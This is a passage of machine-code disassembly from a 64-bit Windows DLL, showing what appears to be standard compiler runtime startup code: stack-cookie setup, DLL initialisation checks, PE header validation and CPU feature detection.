   18000171c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180001723:	2b 00 00 
   180001726:	48 3b c3             	cmp    %rbx,%rax
   180001729:	75 74                	jne    0x18000179f
   18000172b:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   180001730:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180001734:	ff 15 36 19 00 00    	call   *0x1936(%rip)        # 0x180003070
   18000173a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000173e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180001742:	ff 15 18 19 00 00    	call   *0x1918(%rip)        # 0x180003060
   180001748:	8b c0                	mov    %eax,%eax
   18000174a:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   18000174e:	ff 15 04 19 00 00    	call   *0x1904(%rip)        # 0x180003058
   180001754:	8b c0                	mov    %eax,%eax
   180001756:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   18000175a:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   18000175e:	ff 15 ec 18 00 00    	call   *0x18ec(%rip)        # 0x180003050
   180001764:	8b 45 18             	mov    0x18(%rbp),%eax
   180001767:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   18000176b:	48 c1 e0 20          	shl    $0x20,%rax
   18000176f:	48 33 45 18          	xor    0x18(%rbp),%rax
   180001773:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   180001777:	48 33 c1             	xor    %rcx,%rax
   18000177a:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180001781:	ff 00 00 
   180001784:	48 23 c1             	and    %rcx,%rax
   180001787:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   18000178e:	2b 00 00 
   180001791:	48 3b c3             	cmp    %rbx,%rax
   180001794:	48 0f 44 c1          	cmove  %rcx,%rax
   180001798:	48 89 05 61 28 00 00 	mov    %rax,0x2861(%rip)        # 0x180004000
   18000179f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800017a4:	48 f7 d0             	not    %rax
   1800017a7:	48 89 05 92 28 00 00 	mov    %rax,0x2892(%rip)        # 0x180004040
   1800017ae:	48 83 c4 30          	add    $0x30,%rsp
   1800017b2:	5d                   	pop    %rbp
   1800017b3:	c3                   	ret
   1800017b4:	48 8d 0d 35 34 00 00 	lea    0x3435(%rip),%rcx        # 0x180004bf0
   1800017bb:	48 ff 25 b6 18 00 00 	rex.W jmp *0x18b6(%rip)        # 0x180003078
   1800017c2:	cc                   	int3
   1800017c3:	cc                   	int3
   1800017c4:	48 8d 0d 25 34 00 00 	lea    0x3425(%rip),%rcx        # 0x180004bf0
   1800017cb:	e9 d6 06 00 00       	jmp    0x180001ea6
   1800017d0:	48 8d 05 29 34 00 00 	lea    0x3429(%rip),%rax        # 0x180004c00
   1800017d7:	c3                   	ret
   1800017d8:	48 83 ec 28          	sub    $0x28,%rsp
   1800017dc:	e8 1f f8 ff ff       	call   0x180001000
   1800017e1:	48 83 08 24          	orq    $0x24,(%rax)
   1800017e5:	e8 e6 ff ff ff       	call   0x1800017d0
   1800017ea:	48 83 08 02          	orq    $0x2,(%rax)
   1800017ee:	48 83 c4 28          	add    $0x28,%rsp
   1800017f2:	c3                   	ret
   1800017f3:	cc                   	int3
   1800017f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800017f8:	e8 97 06 00 00       	call   0x180001e94
   1800017fd:	85 c0                	test   %eax,%eax
   1800017ff:	74 21                	je     0x180001822
   180001801:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180001808:	00 00 
   18000180a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   18000180e:	eb 05                	jmp    0x180001815
   180001810:	48 3b c8             	cmp    %rax,%rcx
   180001813:	74 14                	je     0x180001829
   180001815:	33 c0                	xor    %eax,%eax
   180001817:	f0 48 0f b1 0d f0 33 	lock cmpxchg %rcx,0x33f0(%rip)        # 0x180004c10
   18000181e:	00 00 
   180001820:	75 ee                	jne    0x180001810
   180001822:	32 c0                	xor    %al,%al
   180001824:	48 83 c4 28          	add    $0x28,%rsp
   180001828:	c3                   	ret
   180001829:	b0 01                	mov    $0x1,%al
   18000182b:	eb f7                	jmp    0x180001824
   18000182d:	cc                   	int3
   18000182e:	cc                   	int3
   18000182f:	cc                   	int3
   180001830:	48 83 ec 28          	sub    $0x28,%rsp
   180001834:	e8 5b 06 00 00       	call   0x180001e94
   180001839:	85 c0                	test   %eax,%eax
   18000183b:	74 07                	je     0x180001844
   18000183d:	e8 9e 04 00 00       	call   0x180001ce0
   180001842:	eb 19                	jmp    0x18000185d
   180001844:	e8 43 06 00 00       	call   0x180001e8c
   180001849:	8b c8                	mov    %eax,%ecx
   18000184b:	e8 74 06 00 00       	call   0x180001ec4
   180001850:	85 c0                	test   %eax,%eax
   180001852:	74 04                	je     0x180001858
   180001854:	32 c0                	xor    %al,%al
   180001856:	eb 07                	jmp    0x18000185f
   180001858:	e8 6d 06 00 00       	call   0x180001eca
   18000185d:	b0 01                	mov    $0x1,%al
   18000185f:	48 83 c4 28          	add    $0x28,%rsp
   180001863:	c3                   	ret
   180001864:	48 83 ec 28          	sub    $0x28,%rsp
   180001868:	33 c9                	xor    %ecx,%ecx
   18000186a:	e8 2d 01 00 00       	call   0x18000199c
   18000186f:	84 c0                	test   %al,%al
   180001871:	0f 95 c0             	setne  %al
   180001874:	48 83 c4 28          	add    $0x28,%rsp
   180001878:	c3                   	ret
   180001879:	cc                   	int3
   18000187a:	cc                   	int3
   18000187b:	cc                   	int3
   18000187c:	48 83 ec 28          	sub    $0x28,%rsp
   180001880:	e8 5f 06 00 00       	call   0x180001ee4
   180001885:	84 c0                	test   %al,%al
   180001887:	75 04                	jne    0x18000188d
   180001889:	32 c0                	xor    %al,%al
   18000188b:	eb 12                	jmp    0x18000189f
   18000188d:	e8 52 06 00 00       	call   0x180001ee4
   180001892:	84 c0                	test   %al,%al
   180001894:	75 07                	jne    0x18000189d
   180001896:	e8 49 06 00 00       	call   0x180001ee4
   18000189b:	eb ec                	jmp    0x180001889
   18000189d:	b0 01                	mov    $0x1,%al
   18000189f:	48 83 c4 28          	add    $0x28,%rsp
   1800018a3:	c3                   	ret
   1800018a4:	48 83 ec 28          	sub    $0x28,%rsp
   1800018a8:	e8 37 06 00 00       	call   0x180001ee4
   1800018ad:	e8 32 06 00 00       	call   0x180001ee4
   1800018b2:	b0 01                	mov    $0x1,%al
   1800018b4:	48 83 c4 28          	add    $0x28,%rsp
   1800018b8:	c3                   	ret
   1800018b9:	cc                   	int3
   1800018ba:	cc                   	int3
   1800018bb:	cc                   	int3
   1800018bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800018c1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800018c6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800018cb:	57                   	push   %rdi
   1800018cc:	48 83 ec 20          	sub    $0x20,%rsp
   1800018d0:	49 8b f9             	mov    %r9,%rdi
   1800018d3:	49 8b f0             	mov    %r8,%rsi
   1800018d6:	8b da                	mov    %edx,%ebx
   1800018d8:	48 8b e9             	mov    %rcx,%rbp
   1800018db:	e8 b4 05 00 00       	call   0x180001e94
   1800018e0:	85 c0                	test   %eax,%eax
   1800018e2:	75 16                	jne    0x1800018fa
   1800018e4:	83 fb 01             	cmp    $0x1,%ebx
   1800018e7:	75 11                	jne    0x1800018fa
   1800018e9:	4c 8b c6             	mov    %rsi,%r8
   1800018ec:	33 d2                	xor    %edx,%edx
   1800018ee:	48 8b cd             	mov    %rbp,%rcx
   1800018f1:	48 8b c7             	mov    %rdi,%rax
   1800018f4:	ff 15 16 18 00 00    	call   *0x1816(%rip)        # 0x180003110
   1800018fa:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1800018ff:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180001903:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001908:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000190d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001912:	48 83 c4 20          	add    $0x20,%rsp
   180001916:	5f                   	pop    %rdi
   180001917:	e9 a2 05 00 00       	jmp    0x180001ebe
   18000191c:	48 83 ec 28          	sub    $0x28,%rsp
   180001920:	e8 6f 05 00 00       	call   0x180001e94
   180001925:	85 c0                	test   %eax,%eax
   180001927:	74 10                	je     0x180001939
   180001929:	48 8d 0d f0 32 00 00 	lea    0x32f0(%rip),%rcx        # 0x180004c20
   180001930:	48 83 c4 28          	add    $0x28,%rsp
   180001934:	e9 9d 05 00 00       	jmp    0x180001ed6
   180001939:	e8 aa 05 00 00       	call   0x180001ee8
   18000193e:	85 c0                	test   %eax,%eax
   180001940:	75 05                	jne    0x180001947
   180001942:	e8 95 05 00 00       	call   0x180001edc
   180001947:	48 83 c4 28          	add    $0x28,%rsp
   18000194b:	c3                   	ret
   18000194c:	48 83 ec 28          	sub    $0x28,%rsp
   180001950:	33 c9                	xor    %ecx,%ecx
   180001952:	e8 8d 05 00 00       	call   0x180001ee4
   180001957:	48 83 c4 28          	add    $0x28,%rsp
   18000195b:	e9 84 05 00 00       	jmp    0x180001ee4
   180001960:	48 83 ec 28          	sub    $0x28,%rsp
   180001964:	85 c9                	test   %ecx,%ecx
   180001966:	75 07                	jne    0x18000196f
   180001968:	c6 05 a9 32 00 00 01 	movb   $0x1,0x32a9(%rip)        # 0x180004c18
   18000196f:	e8 6c 03 00 00       	call   0x180001ce0
   180001974:	e8 6b 05 00 00       	call   0x180001ee4
   180001979:	84 c0                	test   %al,%al
   18000197b:	75 04                	jne    0x180001981
   18000197d:	32 c0                	xor    %al,%al
   18000197f:	eb 14                	jmp    0x180001995
   180001981:	e8 5e 05 00 00       	call   0x180001ee4
   180001986:	84 c0                	test   %al,%al
   180001988:	75 09                	jne    0x180001993
   18000198a:	33 c9                	xor    %ecx,%ecx
   18000198c:	e8 53 05 00 00       	call   0x180001ee4
   180001991:	eb ea                	jmp    0x18000197d
   180001993:	b0 01                	mov    $0x1,%al
   180001995:	48 83 c4 28          	add    $0x28,%rsp
   180001999:	c3                   	ret
   18000199a:	cc                   	int3
   18000199b:	cc                   	int3
   18000199c:	40 53                	rex push %rbx
   18000199e:	48 83 ec 20          	sub    $0x20,%rsp
   1800019a2:	80 3d 70 32 00 00 00 	cmpb   $0x0,0x3270(%rip)        # 0x180004c19
   1800019a9:	8b d9                	mov    %ecx,%ebx
   1800019ab:	75 67                	jne    0x180001a14
   1800019ad:	83 f9 01             	cmp    $0x1,%ecx
   1800019b0:	77 6a                	ja     0x180001a1c
   1800019b2:	e8 dd 04 00 00       	call   0x180001e94
   1800019b7:	85 c0                	test   %eax,%eax
   1800019b9:	74 28                	je     0x1800019e3
   1800019bb:	85 db                	test   %ebx,%ebx
   1800019bd:	75 24                	jne    0x1800019e3
   1800019bf:	48 8d 0d 5a 32 00 00 	lea    0x325a(%rip),%rcx        # 0x180004c20
   1800019c6:	e8 05 05 00 00       	call   0x180001ed0
   1800019cb:	85 c0                	test   %eax,%eax
   1800019cd:	75 10                	jne    0x1800019df
   1800019cf:	48 8d 0d 62 32 00 00 	lea    0x3262(%rip),%rcx        # 0x180004c38
   1800019d6:	e8 f5 04 00 00       	call   0x180001ed0
   1800019db:	85 c0                	test   %eax,%eax
   1800019dd:	74 2e                	je     0x180001a0d
   1800019df:	32 c0                	xor    %al,%al
   1800019e1:	eb 33                	jmp    0x180001a16
   1800019e3:	66 0f 6f 05 b5 17 00 	movdqa 0x17b5(%rip),%xmm0        # 0x1800031a0
   1800019ea:	00 
   1800019eb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1800019ef:	f3 0f 7f 05 29 32 00 	movdqu %xmm0,0x3229(%rip)        # 0x180004c20
   1800019f6:	00 
   1800019f7:	48 89 05 32 32 00 00 	mov    %rax,0x3232(%rip)        # 0x180004c30
   1800019fe:	f3 0f 7f 05 32 32 00 	movdqu %xmm0,0x3232(%rip)        # 0x180004c38
   180001a05:	00 
   180001a06:	48 89 05 3b 32 00 00 	mov    %rax,0x323b(%rip)        # 0x180004c48
   180001a0d:	c6 05 05 32 00 00 01 	movb   $0x1,0x3205(%rip)        # 0x180004c19
   180001a14:	b0 01                	mov    $0x1,%al
   180001a16:	48 83 c4 20          	add    $0x20,%rsp
   180001a1a:	5b                   	pop    %rbx
   180001a1b:	c3                   	ret
   180001a1c:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001a21:	e8 fa 00 00 00       	call   0x180001b20
   180001a26:	cc                   	int3
   180001a27:	cc                   	int3
   180001a28:	48 83 ec 18          	sub    $0x18,%rsp
   180001a2c:	4c 8b c1             	mov    %rcx,%r8
   180001a2f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001a34:	66 39 05 c5 e5 ff ff 	cmp    %ax,-0x1a3b(%rip)        # 0x180000000
   180001a3b:	75 78                	jne    0x180001ab5
   180001a3d:	48 63 0d f8 e5 ff ff 	movslq -0x1a08(%rip),%rcx        # 0x18000003c
   180001a44:	48 8d 15 b5 e5 ff ff 	lea    -0x1a4b(%rip),%rdx        # 0x180000000
   180001a4b:	48 03 ca             	add    %rdx,%rcx
   180001a4e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180001a54:	75 5f                	jne    0x180001ab5
   180001a56:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001a5b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001a5f:	75 54                	jne    0x180001ab5
   180001a61:	4c 2b c2             	sub    %rdx,%r8
   180001a64:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180001a68:	48 83 c2 18          	add    $0x18,%rdx
   180001a6c:	48 03 d1             	add    %rcx,%rdx
   180001a6f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180001a73:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180001a77:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180001a7b:	48 89 14 24          	mov    %rdx,(%rsp)
   180001a7f:	49 3b d1             	cmp    %r9,%rdx
   180001a82:	74 18                	je     0x180001a9c
   180001a84:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180001a87:	4c 3b c1             	cmp    %rcx,%r8
   180001a8a:	72 0a                	jb     0x180001a96
   180001a8c:	8b 42 08             	mov    0x8(%rdx),%eax
   180001a8f:	03 c1                	add    %ecx,%eax
   180001a91:	4c 3b c0             	cmp    %rax,%r8
   180001a94:	72 08                	jb     0x180001a9e
   180001a96:	48 83 c2 28          	add    $0x28,%rdx
   180001a9a:	eb df                	jmp    0x180001a7b
   180001a9c:	33 d2                	xor    %edx,%edx
   180001a9e:	48 85 d2             	test   %rdx,%rdx
   180001aa1:	75 04                	jne    0x180001aa7
   180001aa3:	32 c0                	xor    %al,%al
   180001aa5:	eb 14                	jmp    0x180001abb
   180001aa7:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180001aab:	7d 04                	jge    0x180001ab1
   180001aad:	32 c0                	xor    %al,%al
   180001aaf:	eb 0a                	jmp    0x180001abb
   180001ab1:	b0 01                	mov    $0x1,%al
   180001ab3:	eb 06                	jmp    0x180001abb
   180001ab5:	32 c0                	xor    %al,%al
   180001ab7:	eb 02                	jmp    0x180001abb
   180001ab9:	32 c0                	xor    %al,%al
   180001abb:	48 83 c4 18          	add    $0x18,%rsp
   180001abf:	c3                   	ret
   180001ac0:	40 53                	rex push %rbx
   180001ac2:	48 83 ec 20          	sub    $0x20,%rsp
   180001ac6:	8a d9                	mov    %cl,%bl
   180001ac8:	e8 c7 03 00 00       	call   0x180001e94
   180001acd:	33 d2                	xor    %edx,%edx
   180001acf:	85 c0                	test   %eax,%eax
   180001ad1:	74 0b                	je     0x180001ade
   180001ad3:	84 db                	test   %bl,%bl
   180001ad5:	75 07                	jne    0x180001ade
   180001ad7:	48 87 15 32 31 00 00 	xchg   %rdx,0x3132(%rip)        # 0x180004c10
   180001ade:	48 83 c4 20          	add    $0x20,%rsp
   180001ae2:	5b                   	pop    %rbx
   180001ae3:	c3                   	ret
   180001ae4:	40 53                	rex push %rbx
   180001ae6:	48 83 ec 20          	sub    $0x20,%rsp
   180001aea:	80 3d 27 31 00 00 00 	cmpb   $0x0,0x3127(%rip)        # 0x180004c18
   180001af1:	8a d9                	mov    %cl,%bl
   180001af3:	74 04                	je     0x180001af9
   180001af5:	84 d2                	test   %dl,%dl
   180001af7:	75 0c                	jne    0x180001b05
   180001af9:	e8 e6 03 00 00       	call   0x180001ee4
   180001afe:	8a cb                	mov    %bl,%cl
   180001b00:	e8 df 03 00 00       	call   0x180001ee4
   180001b05:	b0 01                	mov    $0x1,%al
   180001b07:	48 83 c4 20          	add    $0x20,%rsp
   180001b0b:	5b                   	pop    %rbx
   180001b0c:	c3                   	ret
   180001b0d:	cc                   	int3
   180001b0e:	cc                   	int3
   180001b0f:	cc                   	int3
   180001b10:	48 8d 05 49 31 00 00 	lea    0x3149(%rip),%rax        # 0x180004c60
   180001b17:	c3                   	ret
   180001b18:	83 25 31 31 00 00 00 	andl   $0x0,0x3131(%rip)        # 0x180004c50
   180001b1f:	c3                   	ret
   180001b20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b25:	55                   	push   %rbp
   180001b26:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180001b2d:	ff 
   180001b2e:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180001b35:	8b d9                	mov    %ecx,%ebx
   180001b37:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001b3c:	ff 15 06 15 00 00    	call   *0x1506(%rip)        # 0x180003048
   180001b42:	85 c0                	test   %eax,%eax
   180001b44:	74 04                	je     0x180001b4a
   180001b46:	8b cb                	mov    %ebx,%ecx
   180001b48:	cd 29                	int    $0x29
   180001b4a:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001b4f:	e8 c4 ff ff ff       	call   0x180001b18
   180001b54:	33 d2                	xor    %edx,%edx
   180001b56:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001b5a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180001b60:	e8 47 03 00 00       	call   0x180001eac
   180001b65:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001b69:	ff 15 f9 14 00 00    	call   *0x14f9(%rip)        # 0x180003068
   180001b6f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180001b76:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180001b7d:	48 8b cb             	mov    %rbx,%rcx
   180001b80:	45 33 c0             	xor    %r8d,%r8d
   180001b83:	ff 15 97 14 00 00    	call   *0x1497(%rip)        # 0x180003020
   180001b89:	48 85 c0             	test   %rax,%rax
   180001b8c:	74 3c                	je     0x180001bca
   180001b8e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180001b94:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180001b9b:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180001ba2:	4c 8b c8             	mov    %rax,%r9
   180001ba5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180001baa:	4c 8b c3             	mov    %rbx,%r8
   180001bad:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180001bb4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180001bb9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001bbd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180001bc2:	33 c9                	xor    %ecx,%ecx
   180001bc4:	ff 15 5e 14 00 00    	call   *0x145e(%rip)        # 0x180003028
   180001bca:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180001bd1:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001bd6:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180001bdd:	33 d2                	xor    %edx,%edx
   180001bdf:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180001be6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180001bec:	48 83 c0 08          	add    $0x8,%rax
   180001bf0:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180001bf7:	e8 b0 02 00 00       	call   0x180001eac
   180001bfc:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180001c03:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180001c08:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   180001c0f:	40 
   180001c10:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180001c17:	00 
   180001c18:	ff 15 62 14 00 00    	call   *0x1462(%rip)        # 0x180003080
   180001c1e:	8b d8                	mov    %eax,%ebx
   180001c20:	33 c9                	xor    %ecx,%ecx
   180001c22:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180001c27:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180001c2c:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001c30:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001c35:	ff 15 fd 13 00 00    	call   *0x13fd(%rip)        # 0x180003038
   180001c3b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180001c40:	ff 15 ea 13 00 00    	call   *0x13ea(%rip)        # 0x180003030
   180001c46:	85 c0                	test   %eax,%eax
   180001c48:	75 0d                	jne    0x180001c57
   180001c4a:	83 fb 01             	cmp    $0x1,%ebx
   180001c4d:	74 08                	je     0x180001c57
   180001c4f:	8d 48 03             	lea    0x3(%rax),%ecx
   180001c52:	e8 c1 fe ff ff       	call   0x180001b18
   180001c57:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180001c5e:	00 
   180001c5f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180001c66:	5d                   	pop    %rbp
   180001c67:	c3                   	ret
   180001c68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001c6d:	57                   	push   %rdi
   180001c6e:	48 83 ec 20          	sub    $0x20,%rsp
   180001c72:	48 8d 1d c7 19 00 00 	lea    0x19c7(%rip),%rbx        # 0x180003640
   180001c79:	48 8d 3d c0 19 00 00 	lea    0x19c0(%rip),%rdi        # 0x180003640
   180001c80:	eb 12                	jmp    0x180001c94
   180001c82:	48 8b 03             	mov    (%rbx),%rax
   180001c85:	48 85 c0             	test   %rax,%rax
   180001c88:	74 06                	je     0x180001c90
   180001c8a:	ff 15 80 14 00 00    	call   *0x1480(%rip)        # 0x180003110
   180001c90:	48 83 c3 08          	add    $0x8,%rbx
   180001c94:	48 3b df             	cmp    %rdi,%rbx
   180001c97:	72 e9                	jb     0x180001c82
   180001c99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001c9e:	48 83 c4 20          	add    $0x20,%rsp
   180001ca2:	5f                   	pop    %rdi
   180001ca3:	c3                   	ret
   180001ca4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001ca9:	57                   	push   %rdi
   180001caa:	48 83 ec 20          	sub    $0x20,%rsp
   180001cae:	48 8d 1d 9b 19 00 00 	lea    0x199b(%rip),%rbx        # 0x180003650
   180001cb5:	48 8d 3d 94 19 00 00 	lea    0x1994(%rip),%rdi        # 0x180003650
   180001cbc:	eb 12                	jmp    0x180001cd0
   180001cbe:	48 8b 03             	mov    (%rbx),%rax
   180001cc1:	48 85 c0             	test   %rax,%rax
   180001cc4:	74 06                	je     0x180001ccc
   180001cc6:	ff 15 44 14 00 00    	call   *0x1444(%rip)        # 0x180003110
   180001ccc:	48 83 c3 08          	add    $0x8,%rbx
   180001cd0:	48 3b df             	cmp    %rdi,%rbx
   180001cd3:	72 e9                	jb     0x180001cbe
   180001cd5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001cda:	48 83 c4 20          	add    $0x20,%rsp
   180001cde:	5f                   	pop    %rdi
   180001cdf:	c3                   	ret
   180001ce0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001ce5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001cea:	57                   	push   %rdi
   180001ceb:	48 83 ec 10          	sub    $0x10,%rsp
   180001cef:	33 c0                	xor    %eax,%eax
   180001cf1:	33 c9                	xor    %ecx,%ecx
   180001cf3:	0f a2                	cpuid
   180001cf5:	44 8b c1             	mov    %ecx,%r8d
   180001cf8:	45 33 db             	xor    %r11d,%r11d
   180001cfb:	44 8b d2             	mov    %edx,%r10d
   180001cfe:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   180001d05:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180001d0c:	44 8b cb             	mov    %ebx,%r9d
   180001d0f:	8b f0                	mov    %eax,%esi
   180001d11:	33 c9                	xor    %ecx,%ecx
   180001d13:	41 8d 43 01          	lea    0x1(%r11),%eax
   180001d17:	45 0b d0             	or     %r8d,%r10d
   180001d1a:	0f a2                	cpuid
   180001d1c:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   180001d23:	89 04 24             	mov    %eax,(%rsp)
   180001d26:	45 0b d1             	or     %r9d,%r10d
   180001d29:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180001d2d:	8b f9                	mov    %ecx,%edi
   180001d2f:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180001d33:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180001d37:	75 5b                	jne    0x180001d94
   180001d39:	48 83 0d 1f 23 00 00 	orq    $0xffffffffffffffff,0x231f(%rip)        # 0x180004060
   180001d40:	ff 
   180001d41:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180001d46:	48 c7 05 07 23 00 00 	movq   $0x8000,0x2307(%rip)        # 0x180004058
   180001d4d:	00 80 00 00 
   180001d51:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180001d56:	74 28                	je     0x180001d80
   180001d58:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180001d5d:	74 21                	je     0x180001d80
   180001d5f:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180001d64:	74 1a                	je     0x180001d80
   180001d66:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180001d6b:	83 f8 20             	cmp    $0x20,%eax
   180001d6e:	77 24                	ja     0x180001d94
   180001d70:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180001d77:	00 00 00 
   180001d7a:	48 0f a3 c1          	bt     %rax,%rcx
   180001d7e:	73 14                	jae    0x180001d94
   180001d80:	44 8b 05 cd 2e 00 00 	mov    0x2ecd(%rip),%r8d        # 0x180004c54
   180001d87:	41 83 c8 01          	or     $0x1,%r8d
   180001d8b:	44 89 05 c2 2e 00 00 	mov    %r8d,0x2ec2(%rip)        # 0x180004c54
   180001d92:	eb 07                	jmp    0x180001d9b
   180001d94:	44 8b 05 b9 2e 00 00 	mov    0x2eb9(%rip),%r8d        # 0x180004c54
   180001d9b:	b8 07 00 00 00       	mov    $0x7,%eax
   180001da0:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   180001da4:	3b f0                	cmp    %eax,%esi
   180001da6:	7c 26                	jl     0x180001dce
   180001da8:	33 c9                	xor    %ecx,%ecx
   180001daa:	0f a2                	cpuid
   180001dac:	89 04 24             	mov    %eax,(%rsp)
   180001daf:	44 8b db             	mov    %ebx,%r11d
   180001db2:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180001db6:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180001dba:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180001dbe:	0f ba e3 09          	bt     $0x9,%ebx
   180001dc2:	73 0a                	jae    0x180001dce
   180001dc4:	45 0b c1             	or     %r9d,%r8d
   180001dc7:	44 89 05 86 2e 00 00 	mov    %r8d,0x2e86(%rip)        # 0x180004c54
   180001dce:	c7 05 78 22 00 00 01 	movl   $0x1,0x2278(%rip)        # 0x180004050
   180001dd5:	00 00 00 
   180001dd8:	44 89 0d 75 22 00 00 	mov    %r9d,0x2275(%rip)        # 0x180004054
   180001ddf:	0f ba e7 14          	bt     $0x14,%edi
   180001de3:	0f 83 91 00 00 00    	jae    0x180001e7a
   180001de9:	44 89 0d 60 22 00 00 	mov    %r9d,0x2260(%rip)        # 0x180004050
   180001df0:	bb 06 00 00 00       	mov    $0x6,%ebx
   180001df5:	89 1d 59 22 00 00    	mov    %ebx,0x2259(%rip)        # 0x180004054
   180001dfb:	0f ba e7 1b          	bt     $0x1b,%edi
   180001dff:	73 79                	jae    0x180001e7a
   180001e01:	0f ba e7 1c          	bt     $0x1c,%edi
   180001e05:	73 73                	jae    0x180001e7a
   180001e07:	33 c9                	xor    %ecx,%ecx
   180001e09:	0f 01 d0             	xgetbv
   180001e0c:	48 c1 e2 20          	shl    $0x20,%rdx
   180001e10:	48 0b d0             	or     %rax,%rdx
   180001e13:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180001e18:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180001e1d:	22 c3                	and    %bl,%al
   180001e1f:	3a c3                	cmp    %bl,%al
   180001e21:	75 57                	jne    0x180001e7a
   180001e23:	8b 05 2b 22 00 00    	mov    0x222b(%rip),%eax        # 0x180004054
   180001e29:	83 c8 08             	or     $0x8,%eax
   180001e2c:	c7 05 1a 22 00 00 03 	movl   $0x3,0x221a(%rip)        # 0x180004050
   180001e33:	00 00 00 
   180001e36:	89 05 18 22 00 00    	mov    %eax,0x2218(%rip)        # 0x180004054
